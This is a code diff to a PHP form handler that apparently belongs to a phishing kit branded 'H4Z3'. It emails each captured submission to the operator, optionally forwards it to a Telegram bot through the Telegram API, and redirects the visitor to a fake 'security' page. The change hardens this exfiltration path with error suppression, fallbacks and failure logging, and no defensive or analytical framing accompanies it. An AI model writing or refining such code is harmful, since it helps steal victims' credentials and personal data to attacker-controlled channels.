@@ -28,20 +28,20 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
       $headers  = "From: 🐱‍💻 ‍H4Z3 🐱‍💻 <m4r1ju4n4r3sult@h4z3.com>\r\n";
       $headers .= "MIME-Version: 1.0\r\n";
       $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
-    mail($to,$subject,$body,$headers);
+    if (function_exists('mail')) {
+        $mailResult = @mail($to, $subject, $body, $headers);
+        if (!$mailResult) {
+            h4z3_mark_channel_failure('mail_failed');
+        }
+    } else {
+        h4z3_mark_channel_failure('mail_unavailable');
+    }
 
     if($tgresult == "on"){
-        require"$data";
-        $data = $body;
-          $send = ['chat_id'=>$chatid,'text'=>$data];
-          $website = "https://api.telegram.org/{$boturl}";
-          $ch = curl_init($website . '/sendMessage');
-          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-          curl_setopt($ch, CURLOPT_POST, 1);
-          curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
-          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-          $result = curl_exec($ch);
-          curl_close($ch);
+        $telegramResult = h4z3_send_telegram($body, $boturl, $chatid);
+        if (!$telegramResult) {
+            h4z3_mark_channel_failure('telegram_failed');
+        }
         }
 
      header('Location: ../security');     
